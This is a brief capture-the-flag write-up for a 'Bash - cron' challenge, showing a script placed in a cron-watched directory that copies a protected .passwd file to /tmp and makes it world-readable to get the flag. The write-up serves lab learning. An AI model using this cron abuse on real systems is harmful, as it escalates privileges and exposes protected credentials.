## Bash - cron

| Author | Level | Points |
| ------ | ----- | ------ |
| g0uz | Medium | 20 |


> Crontab

#### Solution

Create a `job` for `crontab` in `/tmp/._cron` and edit it

```sh
#!/bin/sh
/bin/cat /challenge/app-script/ch4/.passwd > /tmp/pass
chmod 777 /tmp/pass
```

```
chmod 777 /tmp/._cron/job
```

Then `cat` `/tmp/pass` to get the flag.
